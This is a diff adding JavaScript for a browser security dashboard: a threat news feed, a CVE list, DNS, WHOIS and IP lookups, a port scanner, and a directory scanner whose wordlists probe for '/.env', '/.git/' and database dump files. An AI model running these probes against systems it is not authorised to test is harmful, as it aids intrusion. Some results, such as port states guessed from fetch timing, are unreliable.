+// ── news ──────────────────────────────────────────────────
+var NEWS=[
+  {id:1,cat:'conflict',tag:'IRAN/USA',title:'US Cyber Command Confirms Offensive Ops Against Iranian IRGC Networks',date:'Mar 9 2026',src:'The Intercept',body:'US Cyber Command confirmed offensive cyber operations targeting networks linked to Iran\'s Islamic Revolutionary Guard Corps (IRGC). The actions, described as "defensive forward" operations, targeted C2 infrastructure used by Iranian hackers against US critical infrastructure.\n\nIranian groups — particularly APT42 (Charming Kitten) — have been conducting aggressive spearphishing campaigns against US defense contractors, energy companies, and government officials.\n\nThe IRGC reportedly responded with increased DDoS attacks against US financial institutions and attempts to infiltrate water treatment SCADA systems in three US states.'},
+  {id:2,cat:'apt',tag:'APT GROUPS',title:'APT42 Deploys "PhantomMail" AI-Powered Spearphishing Framework',date:'Mar 8 2026',src:'Mandiant',body:'Mandiant identified a new spearphishing framework called "PhantomMail" attributed with high confidence to APT42, an Iranian state-sponsored group linked to the IRGC Intelligence Organization.\n\nThe framework uses AI-generated personalized emails mimicking legitimate contacts. Targets include a major US defense contractor in drone manufacturing, two Middle East policy think tanks, and individuals at Treasury OFAC.\n\nAPT42 has dramatically increased operational tempo since Q4 2025, coinciding with reimposition of US oil sanctions.'},
+  {id:3,cat:'breach',tag:'BREACH',title:'Salt Typhoon Breach Deeper Than Reported: 9 Carriers, Wiretap Systems Accessed',date:'Mar 7 2026',src:'WSJ / CISA',body:'New details confirm Salt Typhoon compromised nine US carriers and successfully accessed lawful interception (LI) systems used for court-ordered wiretaps.\n\nAttributed to China\'s Ministry of State Security, the actors maintained persistent access for 18 months. They harvested call and text metadata for hundreds of millions of users.\n\nCISA issued an emergency directive requiring federal agencies to transition to end-to-end encrypted messaging.'},
+  {id:4,cat:'vuln',tag:'ZERO-DAY',title:'CRITICAL: Apache HTTP Server RCE CVE-2025-1938 — Patch Now',date:'Mar 6 2026',src:'CISA / Apache',body:'A critical unauthenticated RCE in Apache HTTP Server (2.4.0-2.4.62) is being actively exploited. CVE-2025-1938 (CVSS 9.8) allows code execution via a crafted HTTP request targeting mod_rewrite.\n\nThree threat actor clusters are exploiting the flaw, including one attributed to Iranian state-sponsored actors.\n\nUpdate immediately to Apache 2.4.63+. CISA has added to the KEV catalog — federal agencies must patch within 48 hours.'},
+  {id:5,cat:'apt',tag:'APT GROUPS',title:'Volt Typhoon Re-Emerges: ICS Pre-Positioning in 6 US States',date:'Mar 5 2026',src:'FBI / CISA',body:'A joint FBI/CISA advisory warns that Volt Typhoon has re-established footholds in critical infrastructure across six US states after a disruption operation in late 2024.\n\nThe group uses living-off-the-land (LOTL) techniques and has been observed in water utilities, electrical grid operators, and port authorities.'},
+  {id:6,cat:'conflict',tag:'IRAN/USA',title:'Iranian Hackers Leak US Military Contractor Communications on Telegram',date:'Mar 4 2026',src:'Reuters / ClearSky',body:'An Iranian group with suspected IRGC ties published internal communications from a US defense contractor on Telegram. ClearSky assesses with moderate confidence this is a front for APT34 (OilRig/Helix Kitten).'},
+  {id:7,cat:'vuln',tag:'ZERO-DAY',title:'Ivanti Connect Secure Auth Bypass Chained With RCE — Mass Exploitation',date:'Mar 3 2026',src:'Volexity',body:'CVE-2025-0282 and CVE-2025-0283 in Ivanti Connect Secure are being chained for unauthenticated RCE. Mass exploitation began within 24 hours of disclosure.'},
+  {id:8,cat:'breach',tag:'BREACH',title:'AI Deepfake CEO Voice Used in $25M Wire Fraud',date:'Mar 2 2026',src:'FT / NCSC',body:'UK authorities investigated a case where criminals used an AI voice clone of a CEO to instruct a finance employee to transfer £19.8M to a fraudulent account. This represents a major evolution in BEC attacks enhanced by generative AI.'}
+];
+
+var curNewsTab='all';
+function loadNews(){
+  var filtered=NEWS.filter(function(n){return curNewsTab==='all'||n.cat===curNewsTab;});
+  var grid=G('ngrid');if(!grid)return;
+  grid.innerHTML='';grid.style.display='grid';
+  filtered.forEach(function(n){
+    var c=document.createElement('div');c.className='ncard';
+    c.innerHTML='<div class="ntag '+n.cat+'">'+n.tag+'</div><div class="ntitle">'+n.title+'</div><div class="nmeta"><span class="nsrc">'+n.src+'</span>'+n.date+'</div>';
+    c.onclick=function(){openArt(n.id);};
+    grid.appendChild(c);
+  });
+  var art=G('nart');if(art){art.innerHTML='';art.classList.remove('on');}
+}
+function ntab(t,el){curNewsTab=t;document.querySelectorAll('#ntabs .tab').forEach(function(x){x.classList.remove('on');});if(el)el.classList.add('on');loadNews();}
+window.ntab=ntab;
+function openArt(id){
+  var n=NEWS.find(function(x){return x.id===id;});if(!n)return;
+  G('ngrid').style.display='none';
+  var art=G('nart');art.innerHTML='';
+  var back=document.createElement('div');back.className='aback';back.textContent='← BACK TO FEED';back.onclick=function(){G('nart').classList.remove('on');G('ngrid').style.display='grid';};
+  var badge=document.createElement('span');badge.className='badge bi';badge.style.cssText='margin-bottom:10px;display:inline-block';badge.textContent=n.tag;
+  var title=document.createElement('div');title.className='atitle';title.textContent=n.title;
+  var meta=document.createElement('div');meta.style.cssText='font-size:10px;color:var(--dim);margin-bottom:14px';meta.innerHTML='SOURCE: <span style="color:var(--cyan)">'+n.src+'</span> &nbsp;|&nbsp; '+n.date;
+  var body=document.createElement('div');body.className='abody';body.textContent=n.body;
+  art.appendChild(back);art.appendChild(badge);art.appendChild(title);art.appendChild(meta);art.appendChild(body);
+  art.classList.add('on');
+}
+
+// ── threat map ────────────────────────────────────────────
+var mapCtx=null,mapCount=0,arcs=[];
+var CITIES=[{x:.57,y:.38,col:'#ff3c6e',lbl:'IR'},{x:.21,y:.33,col:'#00d4ff',lbl:'US'},{x:.72,y:.34,col:'#ff8833',lbl:'CN'},{x:.55,y:.27,col:'#cc55ff',lbl:'RU'},{x:.76,y:.32,col:'#ffaa00',lbl:'KP'},{x:.45,y:.27,col:'#00ff88',lbl:'UK'},{x:.55,y:.41,col:'#00d4ff',lbl:'IL'}];
+var ROUTES=[[2,1],[0,1],[3,1],[4,1],[0,6],[2,5],[3,5],[0,1]];
+function initMap(){
+  if(mapCtx)return;
+  var canvas=G('tmcanvas'),map=G('tmap');if(!canvas||!map)return;
+  canvas.width=map.offsetWidth;canvas.height=map.offsetHeight;
+  mapCtx=canvas.getContext('2d');
+  setInterval(spawnArc,700);setInterval(renderArcs,50);
+}
+function drawBase(){var c=mapCtx,w=c.canvas.width,h=c.canvas.height;c.clearRect(0,0,w,h);CITIES.forEach(function(city){var x=city.x*w,y=city.y*h;c.beginPath();c.arc(x,y,4,0,Math.PI*2);c.fillStyle=city.col;c.shadowColor=city.col;c.shadowBlur=8;c.fill();c.shadowBlur=0;c.font='9px monospace';c.fillStyle=city.col;c.fillText(city.lbl,x+7,y+4);});}
+function spawnArc(){if(!mapCtx)return;var r=ROUTES[Math.floor(Math.random()*ROUTES.length)];var s=CITIES[r[0]],d=CITIES[r[1]];var w=mapCtx.canvas.width,h=mapCtx.canvas.height;arcs.push({x1:s.x*w,y1:s.y*h,x2:d.x*w,y2:d.y*h,col:s.col,t:0});mapCount++;var el=G('tmcount');if(el)el.textContent=mapCount.toLocaleString();}
+function renderArcs(){if(!mapCtx)return;var c=mapCtx,w=c.canvas.width,h=c.canvas.height;drawBase();arcs=arcs.filter(function(a){return a.t<1;});arcs.forEach(function(a){a.t+=0.025;var mx=(a.x1+a.x2)/2,my=Math.min(a.y1,a.y2)-35;c.beginPath();for(var i=0;i<=20;i++){var s2=a.t*(i/20);var px=Math.pow(1-s2,2)*a.x1+2*(1-s2)*s2*mx+s2*s2*a.x2;var py=Math.pow(1-s2,2)*a.y1+2*(1-s2)*s2*my+s2*s2*a.y2;if(i===0)c.moveTo(px,py);else c.lineTo(px,py);}c.strokeStyle=a.col+'99';c.lineWidth=1.2;c.stroke();var hx=Math.pow(1-a.t,2)*a.x1+2*(1-a.t)*a.t*mx+a.t*a.t*a.x2;var hy=Math.pow(1-a.t,2)*a.y1+2*(1-a.t)*a.t*my+a.t*a.t*a.y2;c.beginPath();c.arc(hx,hy,3,0,Math.PI*2);c.fillStyle=a.col;c.shadowColor=a.col;c.shadowBlur=10;c.fill();c.shadowBlur=0;});}
+
+// ── CVE ────────────────────────────────────────────────────
+var CVES=[{id:'CVE-2025-1938',score:'9.8',sev:'CRITICAL',cls:'scrit',name:'Apache HTTP Server mod_rewrite RCE',vendor:'Apache',date:'2025-03-01',desc:'Unauthenticated RCE via crafted HTTP request targeting mod_rewrite. Affects 2.4.0-2.4.62. Actively exploited.'},{id:'CVE-2025-0282',score:'9.0',sev:'CRITICAL',cls:'scrit',name:'Ivanti Connect Secure Auth Bypass',vendor:'Ivanti',date:'2025-02-28',desc:'Auth bypass chained with CVE-2025-0283 for unauthenticated RCE. Mass exploitation underway.'},{id:'CVE-2025-0283',score:'8.3',sev:'HIGH',cls:'shigh',name:'Ivanti Connect Secure Buffer Overflow',vendor:'Ivanti',date:'2025-02-28',desc:'Stack-based buffer overflow RCE. Chained with auth bypass. Firmware persistence observed.'},{id:'CVE-2025-2041',score:'9.1',sev:'CRITICAL',cls:'scrit',name:'Cisco IOS XE Web UI Command Injection',vendor:'Cisco',date:'2025-02-20',desc:'Unauthenticated command injection via web UI allows complete device compromise.'},{id:'CVE-2025-1102',score:'8.8',sev:'HIGH',cls:'shigh',name:'Fortinet FortiGate SSL-VPN Path Traversal',vendor:'Fortinet',date:'2025-02-15',desc:'Unauthenticated path traversal reads sensitive config files including credentials.'},{id:'CVE-2025-1544',score:'9.4',sev:'CRITICAL',cls:'scrit',name:'Microsoft Exchange NTLM Relay RCE',vendor:'Microsoft',date:'2025-02-05',desc:'NTLM relay attack against Exchange allows SYSTEM-level code execution. Wormable.'},{id:'CVE-2025-0991',score:'7.5',sev:'HIGH',cls:'shigh',name:'VMware vCenter XXE Injection',vendor:'VMware',date:'2025-02-10',desc:'XML external entity injection allows SSRF and credential theft.'},{id:'CVE-2025-0750',score:'6.8',sev:'MEDIUM',cls:'smed',name:'OpenSSH RSA Key Side-Channel',vendor:'OpenBSD',date:'2025-01-30',desc:'Timing side-channel in RSA decryption may allow key recovery under specific conditions.'}];
+function buildCVE(){var el=G('cvelist');if(!el)return;el.innerHTML='';CVES.forEach(function(cv){var item=document.createElement('div');item.className='cve';item.innerHTML='<div class="cscore '+cv.cls+'">'+cv.score+'</div><div><div class="cid">'+cv.id+' <span class="badge '+(cv.sev==='CRITICAL'?'bh':cv.sev==='HIGH'?'bm':'bo')+'">'+cv.sev+'</span> <span style="color:var(--dim);font-size:9px">'+cv.vendor+' · '+cv.date+'</span></div><div class="cname">'+cv.name+'</div><div class="cdesc">'+cv.desc+'</div></div>';item.onclick=function(){item.classList.toggle('open');};el.appendChild(item);});}
+
+// ── DNS ────────────────────────────────────────────────────
+async function doDNS(){
+  var domain=G('dns-d').value.trim(),type=G('dns-t').value;if(!domain)return;
+  tset('dns-out','<span class="c">$ dns-query '+domain+' --type '+type+'</span>\n<span class="d">Querying...</span>\n');
+  try{var res=await fetch('https://dns.google/resolve?name='+encodeURIComponent(domain)+'&type='+type);var d=await res.json();var types={1:'A',2:'NS',5:'CNAME',6:'SOA',15:'MX',16:'TXT',28:'AAAA',257:'CAA',12:'PTR'};tadd('dns-out','<span class="'+(d.Status===0?'g':'r')+'">Status: '+(d.Status===0?'NOERROR':'ERROR '+d.Status)+'</span>');if(d.Answer&&d.Answer.length){tadd('dns-out','\n<span class="g">── ANSWER ('+d.Answer.length+' records) ──</span>');d.Answer.forEach(function(r){tadd('dns-out','  <span class="y">'+r.name.padEnd(36)+'</span> TTL:<span class="c">'+String(r.TTL).padEnd(7)+'</span> <span class="o">'+(types[r.type]||r.type).padEnd(6)+'</span> <span class="g">'+r.data+'</span>');});}else tadd('dns-out','<span class="o">No '+type+' records found.</span>');tadd('dns-out','\n<span class="d">// Done.</span>');}catch(e){tadd('dns-out','<span class="r">Error: '+e.message+'</span>');}
+}
+window.doDNS=doDNS;
+async function doDNSAll(){
+  var domain=G('dns-d').value.trim();if(!domain)return;
+  tset('dns-out','<span class="c">$ dns-enum '+domain+' --all</span>\n');
+  var types=['A','AAAA','MX','NS','TXT','CNAME','SOA'];
+  for(var i=0;i<types.length;i++){try{var res=await fetch('https://dns.google/resolve?name='+encodeURIComponent(domain)+'&type='+types[i]);var d=await res.json();if(d.Answer&&d.Answer.length){var line='<span class="o">['+types[i]+']</span> ';d.Answer.forEach(function(r){line+='<span class="g">'+r.data+'</span>  ';});tadd('dns-out',line);}}catch(e){}}
+  tadd('dns-out','<span class="d">// All-records enum complete.</span>');
+}
+window.doDNSAll=doDNSAll;
+
+// ── WHOIS ──────────────────────────────────────────────────
+async function doWhois(){
+  var target=G('whois-t').value.trim();if(!target)return;
+  tset('whois-r','<span class="spin"></span><span class="d"> Querying RDAP...</span>');
+  var isIP=/^\d{1,3}(\.\d{1,3}){3}$/.test(target);
+  var urls=isIP?['https://rdap.org/ip/'+target,'https://rdap.arin.net/registry/ip/'+target]:['https://rdap.org/domain/'+encodeURIComponent(target),'https://rdap.verisign.com/com/v1/domain/'+encodeURIComponent(target)];
+  var d=null;
+  for(var i=0;i<urls.length;i++){try{var r=await fetch(urls[i]);if(r.ok){d=await r.json();break;}}catch(e){}}
+  if(!d){tset('whois-r','<span class="r" style="font-size:11px">RDAP lookup failed — try a .com/.net domain or public IP.</span>');return;}
+  var f={};if(d.ldhName)f['Domain']=d.ldhName;if(d.handle)f['Handle']=d.handle;if(d.status)f['Status']=d.status.join(', ');if(d.nameservers)f['Nameservers']=d.nameservers.map(function(n){return n.ldhName;}).join(', ');var getEv=function(t){return (d.events||[]).find(function(e){return e.eventAction===t;});};if(getEv('registration'))f['Registered']=getEv('registration').eventDate.slice(0,10);if(getEv('expiration'))f['Expires']=getEv('expiration').eventDate.slice(0,10);if(d.startAddress)f['IP Start']=d.startAddress;if(d.endAddress)f['IP End']=d.endAddress;if(d.name)f['Network']=d.name;
+  var el=G('whois-r');el.innerHTML='';el.appendChild(rgrid(f));
+}
+window.doWhois=doWhois;
+
+// ── IP INFO ────────────────────────────────────────────────
+async function fetchIPData(ip){
+  var sources=[async function(){var url=ip?'https://ipwho.is/'+ip:'https://ipwho.is/';var r=await fetch(url);var d=await r.json();if(!d.success&&d.message)throw new Error(d.message);return{ip:d.ip,city:d.city,region:d.region,country_name:d.country,country_code:d.country_code,postal:d.postal,timezone:d.timezone&&d.timezone.id||d.timezone,latitude:d.latitude,longitude:d.longitude,org:d.connection&&(d.connection.org||d.connection.isp)||'—',asn:d.connection&&d.connection.asn||'—'};},async function(){var url=ip?'https://freeipapi.com/api/json/'+ip:'https://freeipapi.com/api/json';var r=await fetch(url);var d=await r.json();return{ip:d.ipAddress,city:d.cityName,region:d.regionName,country_name:d.countryName,country_code:d.countryCode,postal:d.zipCode,timezone:d.timeZone,latitude:d.latitude,longitude:d.longitude,org:'—',asn:'—'};},async function(){var url=ip?'https://ipapi.co/'+ip+'/json/':'https://ipapi.co/json/';var r=await fetch(url);var d=await r.json();if(d.error)throw new Error(d.reason);return{ip:d.ip,city:d.city,region:d.region,country_name:d.country_name,country_code:d.country_code,postal:d.postal,timezone:d.timezone,latitude:d.latitude,longitude:d.longitude,org:d.org,asn:d.asn};}];
+  for(var i=0;i<sources.length;i++){try{return await sources[i]();}catch(e){if(i===sources.length-1)throw e;}}
+}
+async function doIP(){
+  var ip=G('ip-t').value.trim();
+  tset('ip-r','<span class="spin"></span><span class="d"> Tracing '+(ip||'your IP')+'...</span>');
+  try{var d=await fetchIPData(ip);var f={'IP':d.ip||'—','City':d.city||'—','Region':d.region||'—','Country':(d.country_name||'—')+' ('+(d.country_code||'?')+')','Postal':d.postal||'—','Timezone':d.timezone||'—','Latitude':String(d.latitude||'—'),'Longitude':String(d.longitude||'—'),'ISP/Org':d.org||'—','ASN':String(d.asn||'—')};var el=G('ip-r');el.innerHTML='';el.appendChild(rgrid(f));if(d.ip)G('hip').textContent=d.ip;}catch(e){tset('ip-r','<span class="r" style="font-size:11px">Error: '+e.message+'</span>');}
+}
+window.doIP=doIP;
+
+// ── TECH DETECT ────────────────────────────────────────────
+var SIGS={'WordPress':['wp-content','wp-includes'],'Drupal':['Drupal.settings','drupal.js'],'Joomla':['Joomla!','joomla'],'React':['react.development','__reactFiber'],'Next.js':['__NEXT_DATA__','_next/static'],'Angular':['ng-version','angular.js'],'Vue.js':['__vue__','vue-router'],'Bootstrap':['bootstrap.css','col-md-'],'jQuery':['jQuery','jquery.min'],'Cloudflare':['cf-ray','__cf_bm','cloudflare'],'AWS':['amazonaws.com','x-amz-'],'Nginx':['nginx'],'Apache':['Apache','mod_'],'Google Analytics':['google-analytics.com','gtag('],'Shopify':['shopify.com','Shopify.theme'],'PHP':['X-Powered-By: PHP','.php'],'Laravel':['laravel_session'],'ASP.NET':['__VIEWSTATE','ASP.NET']};
+async function corsGet(url){var proxies=['https://corsproxy.io/?'+encodeURIComponent(url),'https://api.allorigins.win/get?url='+encodeURIComponent(url)];for(var i=0;i<proxies.length;i++){try{var ctrl=new AbortController();var tid=setTimeout(function(){ctrl.abort();},6000);var r=await fetch(proxies[i],{signal:ctrl.signal});clearTimeout(tid);if(!r.ok)continue;var d=await r.json();if(typeof d==='object'&&d.contents!==undefined)return{html:d.contents||'',code:d.status&&d.status.http_code||200};return{html:JSON.stringify(d),code:200};}catch(e){if(i===proxies.length-1)throw e;}}throw new Error('All proxies failed');}
+async function doTech(){
+  var url=G('tech-u').value.trim();if(!url)return;if(url.indexOf('http')!==0)url='https://'+url;
+  tset('tech-r','<span class="spin"></span><span class="d"> Fingerprinting...</span>');
+  try{var result=await corsGet(url);var html=result.html;var found=[];Object.entries(SIGS).forEach(function(kv){if(kv[1].some(function(s){return html.indexOf(s)!==-1;}))found.push(kv[0]);});var el=G('tech-r');el.innerHTML='';var lbl=document.createElement('div');lbl.className='clabel';lbl.textContent='Detected Technologies';el.appendChild(lbl);var wrap=document.createElement('div');wrap.style.cssText='display:flex;flex-wrap:wrap;gap:6px;margin-top:6px';if(found.length){found.forEach(function(t){var b=document.createElement('span');b.className='badge bi';b.textContent=t;wrap.appendChild(b);});}else{wrap.innerHTML='<span class="d" style="font-size:11px">No signatures matched</span>';}el.appendChild(wrap);var note=document.createElement('div');note.style.cssText='margin-top:10px;font-size:10px;color:var(--dim)';note.textContent='Checked '+Object.keys(SIGS).length+' signatures against '+html.length.toLocaleString()+' bytes';el.appendChild(note);}catch(e){tset('tech-r','<span class="r" style="font-size:11px">Error: '+e.message+'</span>');}
+}
+window.doTech=doTech;
+
+// ── EMAIL OSINT ────────────────────────────────────────────
+var DISP=['mailinator.com','guerrillamail.com','tempmail.com','throwaway.email','yopmail.com','trashmail.com','10minutemail.com','dispostable.com','sharklasers.com','getairmail.com'];
+async function doEmail(){
+  var email=G('em-t').value.trim();if(!email)return;
+  tset('em-r','<span class="spin"></span>');
+  var parts=email.split('@');var user=parts[0],domain=parts[1]||'';
+  var isDisp=DISP.indexOf(domain.toLowerCase())!==-1;
+  var f={'Email':email,'Domain':domain,'Username':user,'Disposable':isDisp?'YES (HIGH RISK)':'No','Has Numbers':/\d/.test(user)?'Yes':'No','Domain Length':String(domain.length)};
+  var mxLine='Checking MX...';
+  try{var res=await fetch('https://dns.google/resolve?name='+encodeURIComponent(domain)+'&type=MX');var d=await res.json();mxLine=d.Answer&&d.Answer.length?d.Answer[0].data:'Not found';}catch(e){mxLine='Error';}
+  f['MX Record']=mxLine;f['Risk']=isDisp?'HIGH':'LOW';
+  var el=G('em-r');el.innerHTML='';el.appendChild(rgrid(f));
+}
+window.doEmail=doEmail;
+
+// ── PORT SCAN ──────────────────────────────────────────────
+var scanStop=false;
+var SVC={21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',587:'SMTP-TLS',993:'IMAPS',995:'POP3S',1433:'MSSQL',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',27017:'MongoDB',9200:'Elasticsearch'};
+var PORT_SETS={common:[21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,27017,587,993,995],web:[80,443,8000,8080,8081,8443,8888,3000,4200,5000],db:[1433,3306,5432,5984,6379,9200,27017],mail:[25,110,143,465,587,993,995]};
+async function probePort(host,port){var start=performance.now();var proto=(port===443||port===8443||port===993||port===995)?'https':'http';try{var ctrl=new AbortController();var tid=setTimeout(function(){ctrl.abort();},2500);await fetch(proto+'://'+host+':'+port+'/',{mode:'no-cors',signal:ctrl.signal});clearTimeout(tid);return{status:'open',lat:Math.round(performance.now()-start)};}catch(e){var lat=Math.round(performance.now()-start);return{status:lat<500?'open':'filtered',lat:lat};}}
+async function doScan(){
+  var host=G('pt-h').value.trim();if(!host)return;
+  var preset=G('pt-p').value;var ports;
+  if(preset==='custom'){var raw=G('pt-c').value.trim();if(raw.indexOf('-')!==-1){var ab=raw.split('-').map(Number);ports=[];for(var i=ab[0];i<=Math.min(ab[1],ab[0]+200);i++)ports.push(i);}else ports=raw.split(',').map(function(s){return parseInt(s.trim());}).filter(Boolean);}else ports=PORT_SETS[preset];
+  scanStop=false;G('pt-tb').innerHTML='';G('pt-tbl').style.display='table';G('pt-prog').style.width='0%';
+  for(var i=0;i<ports.length;i++){if(scanStop)break;var port=ports[i];G('pt-st').textContent='Probing '+host+':'+port+' ('+(i+1)+'/'+ports.length+')...';G('pt-prog').style.width=Math.round((i+1)/ports.length*100)+'%';var result=await probePort(host,port);var svc=SVC[port]||'—';var bc=result.status==='open'?'bo':result.status==='filtered'?'bf':'bc';var note=result.status==='open'&&(port===21||port===23||port===3389)?'&#9888; RISKY':'';var tr=document.createElement('tr');tr.innerHTML='<td style="color:var(--cyan)">'+port+'</td><td style="color:var(--dim)">'+svc+'</td><td><span class="badge '+bc+'">'+result.status+'</span></td><td style="color:var(--dim)">'+result.lat+'ms</td><td style="color:var(--orn);font-size:10px">'+note+'</td>';G('pt-tb').appendChild(tr);}
+  G('pt-st').textContent=scanStop?'Stopped.':'Done — '+ports.length+' ports checked.';G('pt-prog').style.width='100%';
+}
+window.doScan=doScan;
+
+// ── PING ───────────────────────────────────────────────────
+async function doPing(){
+  var host=G('pg-h').value.trim();var count=parseInt(G('pg-c').value)||8;if(!host)return;
+  tset('pg-out','<span class="c">$ ping '+host+' -c '+count+'</span>\n\n');
+  var results=[];
+  for(var i=0;i<count;i++){var start=performance.now();try{var ctrl=new AbortController();var tid=setTimeout(function(){ctrl.abort();},4000);await fetch('https://'+host+'/favicon.ico?_='+Date.now(),{mode:'no-cors',signal:ctrl.signal});clearTimeout(tid);}catch(e){}var lat=Math.round(performance.now()-start);results.push(lat);var col=lat<80?'g':lat<300?'c':'o';tadd('pg-out','  seq='+(i+1)+'  time=<span class="'+col+'">'+lat+'ms</span>');await new Promise(function(r){setTimeout(r,150);});}
+  var min=Math.min.apply(null,results),max=Math.max.apply(null,results),avg=Math.round(results.reduce(function(a,b){return a+b;},0)/results.length);
+  tadd('pg-out','\n<span class="d">── stats ──</span>\nrtt min/avg/max = <span class="y">'+min+'/'+avg+'/'+max+' ms</span>');
+  var el=G('pg-st');el.innerHTML='';el.appendChild(rgrid({'Min RTT':min+'ms','Avg RTT':avg+'ms','Max RTT':max+'ms','Packets':count+'/'+count}));
+}
+window.doPing=doPing;
+
+// ── HEADERS ────────────────────────────────────────────────
+async function doHeaders(){
+  var url=G('hd-u').value.trim();if(!url)return;if(url.indexOf('http')!==0)url='https://'+url;
+  tset('hd-out','<span class="c">$ curl -I '+url+'</span>\n<span class="d">Fetching via proxy...</span>\n');
+  try{var result=await corsGet(url);tadd('hd-out','<span class="g">HTTP '+result.code+'</span>');tadd('hd-out','<span class="d">Content-Length: '+(result.html?result.html.length.toLocaleString():'?')+' bytes</span>');tadd('hd-out','\n<span class="o">── Security Header Audit ──</span>');['Strict-Transport-Security','Content-Security-Policy','X-Frame-Options','X-Content-Type-Options','Permissions-Policy','Referrer-Policy'].forEach(function(h){tadd('hd-out','  <span class="r">✗</span> <span class="d">'+h.padEnd(34)+'</span> <span style="color:#444">not verifiable in browser</span>');});tadd('hd-out','\n<span class="d">// Run: curl -I '+url+' for full headers</span>');}catch(e){tadd('hd-out','<span class="r">Error: '+e.message+'</span>');}
+}
+window.doHeaders=doHeaders;
+
+// ── DIR SCAN ───────────────────────────────────────────────
+var dirStop=false;
+var DIR_LISTS={common:['/robots.txt','/sitemap.xml','/.git/','/wp-admin/','/admin/','/login','/phpmyadmin/','/.env','/.htaccess','/backup/','/api/','/swagger.json'],admin:['/admin/','/administrator/','/wp-admin/','/cpanel/','/plesk/','/webmin/','/phpmyadmin/'],api:['/api/v1/','/api/v2/','/graphql','/swagger.json','/openapi.json','/api-docs/'],backup:['/.git/','/backup.zip','/db.sql','/dump.sql','/old/','/archive/']};
+async function doDir(){
+  var base=G('dr-u').value.trim();if(!base)return;if(base.indexOf('http')!==0)base='https://'+base;base=base.replace(/\/$/,'');
+  var paths=DIR_LISTS[G('dr-l').value];dirStop=false;G('dr-tb').innerHTML='';G('dr-tbl').style.display='table';G('dr-prog').style.width='0%';
+  for(var i=0;i<paths.length;i++){if(dirStop)break;var path=paths[i];G('dr-st').textContent='Checking '+path+' ('+(i+1)+'/'+paths.length+')...';G('dr-prog').style.width=Math.round((i+1)/paths.length*100)+'%';var code='—',size='—',note='';try{var result=await Promise.race([corsGet(base+path),new Promise(function(_,rej){setTimeout(function(){rej(new Error('timeout'));},4000);})]);code=result.code||200;size=result.html?result.html.length.toLocaleString()+'b':'—';if(code===200)note='FOUND';else if(code===403)note='Forbidden';}catch(e){code='ERR';}var tr=document.createElement('tr');var nc=code===200?'g':code===403?'o':'d';tr.innerHTML='<td style="color:var(--grn)">'+path+'</td><td><span class="'+nc+'">'+code+'</span></td><td style="color:var(--dim)">'+size+'</td><td style="color:var(--orn);font-size:10px">'+note+'</td>';G('dr-tb').appendChild(tr);await new Promise(function(r){setTimeout(r,200);});}
+  G('dr-st').textContent=dirStop?'Stopped.':'Done — '+paths.length+' paths checked.';
+}
+window.doDir=doDir;
+
+// ── VULN SCAN ──────────────────────────────────────────────
+async function doVuln(){
+  var url=G('vs-u').value.trim();if(!url)return;if(url.indexOf('http')!==0)url='https://'+url;
+  tset('vs-r','<span class="spin"></span><span class="d"> Running checks...</span>');
+  var checks=[];var html='',code=0;
+  try{var result=await corsGet(url);html=result.html;code=result.code;}catch(e){}
+  if(html.indexOf('<?php')!==-1)checks.push({sev:'HIGH',name:'PHP Source Exposed',desc:'PHP code visible in HTTP response.'});
+  if(!html.includes('Content-Security-Policy'))checks.push({sev:'MED',name:'No Content-Security-Policy',desc:'CSP header absent — elevated XSS risk.'});
+  if(html.includes('wp-content')||html.includes('WordPress'))checks.push({sev:'INFO',name:'WordPress Detected',desc:'Check for vulnerable plugins and default credentials.'});
+  if(html.includes('eval('))checks.push({sev:'MED',name:'eval() Detected',desc:'Use of eval() in JS — potential code injection risk.'});
+  if(url.indexOf('http://')===0)checks.push({sev:'HIGH',name:'No HTTPS',desc:'Site served over HTTP — traffic can be intercepted.'});
+  if(html.length===0)checks.push({sev:'INFO',name:'Empty Response',desc:'No content returned — may be blocked or offline.'});
+  checks.push({sev:'INFO',name:'Scan Complete',desc:'Analyzed '+html.length.toLocaleString()+' bytes. Run nmap + nikto for full assessment.'});
+  var cmap={HIGH:'bh',MED:'bm',LOW:'bo',INFO:'bi',CRITICAL:'bh'};var el=G('vs-r');el.innerHTML='';var lbl=document.createElement('div');lbl.className='clabel';lbl.textContent='Findings ('+checks.length+')';el.appendChild(lbl);checks.forEach(function(c){var item=document.createElement('div');item.style.cssText='padding:9px;border:1px solid var(--brd);border-radius:2px;margin-bottom:5px;background:#040c14';item.innerHTML='<span class="badge '+cmap[c.sev]+'">'+c.sev+'</span> <span style="font-size:12px;color:var(--text);margin-left:6px">'+c.name+'</span><div style="font-size:10px;color:var(--dim);margin-top:3px;padding-left:4px">'+c.desc+'</div>';el.appendChild(item);});
+}
+window.doVuln=doVuln;
+
+// ── SUBNET ─────────────────────────────────────────────────
+function ipToInt(ip){return ip.split('.').reduce(function(a,o){return (a<<8)|parseInt(o);},0)>>>0;}
+function intToIP(n){return [(n>>>24)&255,(n>>>16)&255,(n>>>8)&255,n&255].join('.');}
+function doSubnet(){
+  var raw=G('sn-i').value.trim();var m=raw.match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
+  if(!m){G('sn-r').innerHTML='<span class="r">Invalid CIDR. Example: 192.168.1.0/24</span>';return;}
+  var ip=m[1],p=parseInt(m[2]);var mask=p===0?0:(0xFFFFFFFF<<(32-p))>>>0;var wild=(~mask)>>>0;var net=(ipToInt(ip)&mask)>>>0;var bcast=(net|wild)>>>0;
+  var f={'Network':intToIP(net),'Subnet Mask':intToIP(mask),'Wildcard':intToIP(wild),'Broadcast':intToIP(bcast),'First Host':intToIP(net+1),'Last Host':intToIP(bcast-1),'Hosts':Math.max(0,bcast-net-1).toLocaleString(),'Prefix':'/'+p};
+  var el=G('sn-r');el.innerHTML='';el.appendChild(rgrid(f));
+}
+window.doSubnet=doSubnet;
